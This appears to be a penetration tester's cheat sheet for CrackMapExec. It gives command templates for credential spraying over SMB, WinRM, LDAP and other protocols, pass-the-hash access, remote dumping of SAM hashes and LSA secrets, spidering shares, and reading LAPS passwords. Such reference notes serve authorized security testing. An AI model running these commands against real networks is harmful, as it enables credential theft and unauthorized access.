# [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)

> "A swiss army knife for pentesting networks." Especially useful for Active Directory environments.

---

## General Syntax: Pass a credential(s) to a target(s) to check for access

- `$MODULE`
	- `smb`
		- Useful for determining if a credential is valid
		- if `Pwned`, then the credential grants write access to `C$`
	- `winrm`
		- Even if a credential is valid, if that user doesn't have WinRM access, this will deny access
	- `mssql`
	- `ldap`
	- `ssh`
	- Not yet implemented: `rdp`
		- Even if a user doesn't have `smb` access, they may still have local `rdp` access. Unfortunately this isn't implemented yet, so you'll have to try it manually
- `$TARGET`
	  - Hostname
	  - IP address
	  - CIDR range
- `$DOMAIN`
	  - Active Directory domain name
- `$USERNAME`
	  - Single username
	  - File of usernames, one per line
- `$PASSWORD`
	  - Single password
	  - File of passwords, one per line

```bash
crackmapexec $MODULE $TARGET [-d $DOMAIN || --local-auth] -u $USERNAME -p $PASSWORD
```

- A successful credential pair will be highlighted in **green**
- A successful credential pair that also has remote access will be highlighted in **green** and designated ***Pwned***

---

## Remotely dump SAM hashes

```bash
crackmapexec smb $TARGET [-d $DOMAIN] -u $USERNAME -p $PASSWORD [--local-auth] --sam
```

---

## Remotely dump LSA secrets

```bash
cme smb $TARGET [-d $DOMAIN] -u $USERNAME -p $PASSWORD [--local-auth] --lsa
```

---

## List SMB Shares

```bash
crackmapexec smb $TARGET [-d $DOMAIN] -u $USERNAME [-p $PASSWORD || -H $NTLMHASH] --shares
```

---

## Spider SMB Shares

Spider an SMB share and write the resulting file listings in JSON to an attacker-local file.

```bash
crackmapexec smb $TARGET [-d $DOMAIN] -u $USERNAME [-p $PASSWORD || -H $NTLMHASH] -M spider_plus
```

Filter the results with `jq`!

```bash
cat /tmp/cme_spider_plus | jq
```

---

## Attempt to Read LAPS Passwords

See [[local-administrator-password-solution|LAPS]] for more information.

`$DOMAIN\$USERNAME`:`$PASSWORD` must be capable of reading at least one LAPS password on `$DOMAIN`.

```bash
crackmapexec ldap $TARGET -d $DOMAIN -u $USERNAME [-p $PASSWORD || -H $NTLMHASH] [--kdcHost $DC_FQDN_OR_IP] -M laps
```
